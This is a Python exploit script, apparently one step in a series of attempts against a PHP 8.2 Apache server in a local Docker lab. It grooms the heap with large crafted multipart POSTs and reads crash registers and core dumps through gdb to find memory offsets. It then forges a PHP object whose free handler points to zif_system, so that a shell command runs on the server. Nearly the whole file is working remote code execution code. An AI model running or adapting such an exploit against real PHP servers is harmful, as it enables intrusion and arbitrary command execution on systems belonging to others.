#!/usr/bin/env python3
"""oom137: PROVEN-BODY PHASE-ROTATED NAME-SEA ARM.

oom136 failed: its 3060-char sea names changed the malloc bins -> trip landed
on a K window (rdi=K*8, tag never surfaced). oom134's name-sea body is the
PROVEN recipe: 5/5 tile crashes, tag anchor found, D measured in oom135
(walk trips at first sea temp; rdi = 8B slice inside the name temp's tile
fill; tiles start at val+1 right after the 'p').

oom137 = oom134 body BYTE-EXACT (sea parts 700..999, tile fill = floor of
KEYLEN-8, tag part 830 tiled+shrunk 1536) + the rotation arm:
  measure round (T16)  -> crash core gives D (rdi - temp val base) and A (tag)
  arm round            -> rotate the B||B ring by r so the slice at (D-1)
                          reads exactly B; oom116 block at OFF in tag value;
                          envelope byte-identical to measure body.
GS header packed <IIQQ> per oom116 spec (len must be exact u64 13).
"""
import mmap, re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8083"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
ZIF = 0x39B8A0
CMD = b"whoami>/tmp/x"
MAGIC = 0xC0DEBA5E
SIG8 = struct.pack("<Q", 0x51E2C0DE51E2C0DE)
T16 = SIG8 + struct.pack("<Q", 0xDFE2C0DE51E2C0DF)
KEYLEN = P.KEYLEN
K1 = 4200
TAG_PART = 830
SEA_LO, SEA_HI = 700, 1000          # oom134 exact
VLEN = 1537
CORE = "/tmp/core.137"

def get(url, timeout=90):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def sh(cmd, timeout=120):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()

def x_state():
    return sh("test -f /tmp/x && echo X_EXISTS:$(cat /tmp/x) || echo NO_X").strip()

def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))

def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8083:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False

def post_mod(body, timeout=300):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None

def cell_of(addr):
    return struct.pack("<Q", addr) * 2

def tag8(i):
    return struct.pack("<QQ", MAGIC + i, MAGIC + i)

def rot(tile, r):
    return bytes(tile[(k + r) % 16] for k in range(16))

def name132(i, tile=None, shrink=0):
    """oom134 builder BYTE-EXACT."""
    if tile is not None:
        fill = ((KEYLEN - 8 - shrink) // 16) * 16
        filler = (tile * (fill // len(tile) + 1))[:fill]
    else:
        filler = b"K" * (KEYLEN - 8 - shrink)
    return (b'--BOUND\r\nContent-Disposition: form-data; name="p' + filler
            + b"%d" % i + b'[x]"\r\n\r\n')

def tag_value(i, B=None, OFF=0, arm=False):
    if not arm:
        return tag8(i) + b"v" * (VLEN - 32) + tag8(i)
    v = bytearray(cell_of(B) * (VLEN // 16) + b"P")
    st = struct.pack_into
    st("<II", v, OFF + 0x00, 1, 0x108)          # rc=1, ti=0x108
    st("<II", v, OFF + 0x08, 1, 0)              # handle=1
    st("<Q", v, OFF + 0x10, 0)
    st("<Q", v, OFF + 0x18, B + 0x68)           # handlers -> TBL
    st("<I", v, OFF + 0x2C, 1)                  # num_args
    st("<Q", v, OFF + 0x50, B + 0x90)           # arg = GS
    v[OFF + 0x58] = 6                           # arg type IS_STRING
    st("<I", v, OFF + 0x5C, 0x106)
    st("<Q", v, OFF + 0x68, 0)
    st("<Q", v, OFF + 0x70, BASE + ZIF)         # free_obj = zif_system
    st("<IIQQ", v, OFF + 0x90, 1, 0x106, 0, len(CMD))   # GS header, len u64 = 13
    v[OFF + 0xA8: OFF + 0xA8 + len(CMD) + 1] = CMD + b"\x00"
    for s in range(0, len(v) - 15, 16):
        if not (OFF <= s < OFF + 0xB8):
            v[s:s + 16] = cell_of(B)
    return bytes(v)

def build_post(sea_tile, arm=False, B=None, OFF=0):
    """oom134 build_name_sea BYTE-EXACT geometry, parametric tile + arm block."""
    ps = []
    for i in range(K1):
        intile = SEA_LO <= i < SEA_HI
        shrink = 1536 if i == TAG_PART else 0
        ps.append(name132(i, tile=(sea_tile if intile else None), shrink=shrink)
                  + (tag_value(i, B=B, OFF=OFF, arm=arm) if i == TAG_PART else b"v")
                  + b"\r\n")
    ps += [P.poison_part(n, 5000000 + n * P.CELLS) for n in range(P.PREP)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)

def fire(tag, body, tries, want_crash):
    crashed = False
    for t in range(tries):
        sh("rm -f /tmp/core")
        n0 = segv_count()
        c, r = post_mod(body)
        crashed = False
        for _ in range(10):
            time.sleep(2)
            if segv_count() > n0 or sh("test -f /tmp/core && echo y") == "y":
                crashed = True
                break
        xs = x_state()
        print("%s try%d: http=%s segv+%d core=%s x=%s"
              % (tag, t, c, segv_count() - n0,
                 sh("test -f /tmp/core && echo y") == "y", xs), flush=True)
        if xs.startswith("X_EXISTS"):
            return True, crashed
        if crashed == want_crash:
            return False, crashed
    return False, crashed

def pull_core(dst):
    subprocess.run(["docker", "cp", "php_vuln:/tmp/core", "/tmp/core.tmp"], capture_output=True)
    subprocess.run(["docker", "cp", "/tmp/core.tmp", "phpbuild:" + dst], capture_output=True)
    subprocess.run(["docker", "cp", "phpbuild:" + dst, "/tmp/scan_core"], capture_output=True)

def core_rdi(corepath):
    subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                    'printf "set pagination off\\nset confirm off\\ninfo registers rdi rip\\nquit\\n" > /tmp/g137.gdb'],
                   capture_output=True)
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                        "gdb -q -batch -x /tmp/g137.gdb /tmp/libphp.stock.so %s 2>&1 | grep -E '^rdi|^rip'" % corepath],
                       capture_output=True, timeout=240)
    return r.stdout.decode("latin1").strip()

def phase_of(rdi_txt):
    m = re.search(r"rdi\s+0x([0-9a-f]+)", rdi_txt)
    if not m:
        return None
    rb = struct.pack("<Q", int(m.group(1), 16))
    return next((i for i in range(16) if (T16 + T16)[i:i + 8] == rb), None)

def aim(A):
    for o in range(24, VLEN - 0xB8, 8):
        cand = A + o
        if cand & 0xF == 8 and (cand >> 8) & 1 == 1 and (cand >> 9) & 1 == 0:
            nb = cand.to_bytes(6, "little")
            if not any(b in (0x00, 0x0A, 0x0D, 0x22, 0x27, 0x5C, 0x3B, 0x3D) for b in nb):
                return cand, o
    return None, None

def analyze_measure(rdi_txt):
    """rdi, D (rdi - temp val base), tag addr A. Temp hdr = 01 00 00 00 16 00 00 00, val at +0x18."""
    m = re.search(r"rdi\s+0x([0-9a-f]+)", rdi_txt)
    if not m:
        return None, None, None
    rdi = int(m.group(1), 16)
    f = open("/tmp/scan_core", "rb")
    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
    e_phoff = struct.unpack_from("<Q", mm, 0x20)[0]
    e_phentsize, e_phnum = struct.unpack_from("<HH", mm, 0x36)
    segs = []
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        pt = struct.unpack_from("<I", mm, off)[0]
        po, pv, pa, pf = struct.unpack_from("<QQQQ", mm, off + 8)
        if pt == 1 and pf > 0x10000:
            segs.append((pv, po, pf))
    HDR = b"\x01\x00\x00\x00\x16\x00\x00\x00"
    PH7 = (T16 + T16)[7:15]
    D = None
    ph = phase_of(rdi_txt)
    if ph == 7:
        # rdi holds TILE BYTES, not an address: find the slice in heap segs
        # (oom135 method), then D = slice_vaddr - (temp_HDR_vaddr + 0x18).
        for pv, po, pf in segs:
            if pf < 0x100000:
                continue
            j = mm.find(PH7, po, po + pf)
            if j < 0:
                continue
            slice_va = pv + (j - po)
            h = mm.rfind(HDR, max(po, j - 65536), j)
            if h < 0:
                continue
            h_va = pv + (h - po)
            D = slice_va - (h_va + 0x18)
            break
    m4 = struct.pack("<Q", MAGIC + TAG_PART)
    tag = None
    for pv, po, pf in segs:
        j = mm[po:po + pf].find(m4)
        if j >= 0:
            tag = pv + j
            break
    mm.close(); f.close()
    return rdi, D, tag

print("=== oom137: proven-body phase-rotated arm ===", flush=True)
assert recreate(), "recreate failed"
md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
assert md5 == STOCK_MD5, "not stock: " + md5
print("md5 ok", flush=True)

for k1 in P.K1S[:-1]:
    post_mod(P.build_attack(k1, 5000000))
print("shaped segv=%d" % segv_count(), flush=True)
BASE = base_now()
print("base=0x%x" % BASE, flush=True)
print("pre x: %s" % x_state(), flush=True)

m_body = build_post(T16)
print("m=%.2fMB" % (len(m_body) / 1048576.0), flush=True)

for rnd in range(1, 5):
    print("--- r%d ---" % rnd, flush=True)
    won, crashed = fire("r%d-meas" % rnd, m_body, tries=4, want_crash=True)
    if won:
        print("!!! CAMPAIGN WON (meas r%d)" % rnd, flush=True)
        break
    if not crashed:
        print("r%d-meas no crash" % rnd, flush=True)
        continue
    pull_core("%s_r%dm" % (CORE, rnd))
    rdi_txt = core_rdi("%s_r%dm" % (CORE, rnd))
    ph = phase_of(rdi_txt)
    print("r%d-meas gdb: %s phase=%s" % (rnd, rdi_txt, ph), flush=True)
    rdi, D, A = analyze_measure(rdi_txt)
    print("r%d analyze: rdi=0x%x D=%s A=%s" % (rnd, rdi or 0, D, A and hex(A)), flush=True)
    if A is None or D is None:
        print("r%d: missing anchor/D" % rnd, flush=True)
        continue
    k = (D - 1) % 16                    # tile stream starts at val+1 ('p' prefix)
    if D is None or not (1 <= D - 1 <= ((KEYLEN - 8) // 16) * 16 - 8):
        print("r%d: D out of tile-fill range (D=%s)" % (rnd, D), flush=True)
        continue
    B, OFF = aim(A)
    print("aim: B=%s OFF=%s" % (B and hex(B), OFF), flush=True)
    if B is None:
        print("cannot aim", flush=True)
        continue
    b8 = cell_of(B)
    P16 = bytearray(b"\xde" * 16)      # odd phase -> construct ring, not rotate
    for j in range(8):
        P16[(k + j) % 16] = b8[j]
    arm_tile = bytes(P16)
    assert all(arm_tile), "NUL in arm ring"
    assert (arm_tile * 2)[k:k + 8] == b8, "slice verify failed"
    a_body = build_post(arm_tile, arm=True, B=B, OFF=OFF)
    drift = abs(len(a_body) - len(m_body))
    print("k=%d a_body=%d drift=%d" % (k, len(a_body), drift), flush=True)
    assert drift <= 8, "envelope drift %d" % drift
    won, crashed = fire("r%d-arm" % rnd, a_body, tries=6, want_crash=False)
    if won:
        print("!!! CAMPAIGN WON (arm r%d): %s" % (rnd, x_state()), flush=True)
        break
    if crashed:
        pull_core("%s_r%da" % (CORE, rnd))
        print("r%d-arm gdb: %s" % (rnd, core_rdi("%s_r%da" % (CORE, rnd))), flush=True)

print("final x: %s" % x_state(), flush=True)
print("=== done ===", flush=True)
